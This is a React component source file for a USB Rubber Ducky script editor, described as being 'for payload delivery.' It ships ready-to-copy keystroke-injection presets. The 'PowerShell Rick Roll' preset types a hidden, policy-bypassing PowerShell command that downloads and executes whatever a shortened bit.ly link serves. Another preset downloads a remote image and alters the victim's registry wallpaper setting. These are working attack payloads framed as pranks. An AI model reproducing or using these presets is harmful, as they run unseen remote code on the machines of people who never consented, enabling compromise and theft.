
'use client';

import { useState } from 'react';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Clipboard, Code2 } from 'lucide-react';
import { Label } from '@/components/ui/label';

const duckyPresets: Record<string, string> = {
  'hello-world': `DELAY 1000
GUI r
DELAY 100
STRING notepad
ENTER
DELAY 500
STRING Hello, World!
ENTER`,
  'rick-roll': `DELAY 1000
GUI r
DELAY 100
STRING powershell -w h -NoP -NonI -Exec Bypass "$pl = iwr 'https://bit.ly/3yZ4JzW' -UseBasicParsing; iex $pl"
ENTER`,
  'wallpaper-prank': `DELAY 1000
GUI r
DELAY 100
STRING powershell -w h -c "iwr -uri 'https://i.imgur.com/eBw6jF8.jpeg' -outfile C:\\Users\\Public\\prank.jpg; sp 'HKCU:Control Panel\\Desktop' WallPaper C:\\Users\\Public\\prank.jpg; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
ENTER`
};

export function RubberDuckyEditor() {
  const [script, setScript] = useState(duckyPresets['hello-world']);
  const { toast } = useToast();

  const handlePresetChange = (value: string) => {
    if (duckyPresets[value]) {
      setScript(duckyPresets[value]);
    }
  };
  
  const handleCopy = () => {
    navigator.clipboard.writeText(script);
    toast({
      title: 'Copied!',
      description: 'DuckyScript copied to clipboard.',
    });
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <Code2 className="h-6 w-6" />
          <CardTitle>Rubber Ducky Script Editor</CardTitle>
        </div>
        <CardDescription>
          Create or modify USB Rubber Ducky scripts for payload delivery.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="space-y-2">
            <Label htmlFor="preset-select">Load a preset</Label>
            <Select onValueChange={handlePresetChange} defaultValue="hello-world">
                <SelectTrigger id="preset-select">
                    <SelectValue placeholder="Select a script preset" />
                </SelectTrigger>
                <SelectContent>
                    <SelectItem value="hello-world">Hello World</SelectItem>
                    <SelectItem value="rick-roll">PowerShell Rick Roll</SelectItem>
                    <SelectItem value="wallpaper-prank">Wallpaper Prank</SelectItem>
                </SelectContent>
            </Select>
        </div>
        <div className="space-y-2">
            <Label htmlFor="script-editor">Script</Label>
            <Textarea
                id="script-editor"
                value={script}
                onChange={(e) => setScript(e.target.value)}
                className="font-mono h-64 bg-primary/20"
                placeholder="REM Your DuckyScript starts here..."
            />
        </div>
      </CardContent>
      <CardFooter>
        <Button onClick={handleCopy}>
          <Clipboard className="mr-2 h-4 w-4" />
          Copy Script
        </Button>
      </CardFooter>
    </Card>
  );
}
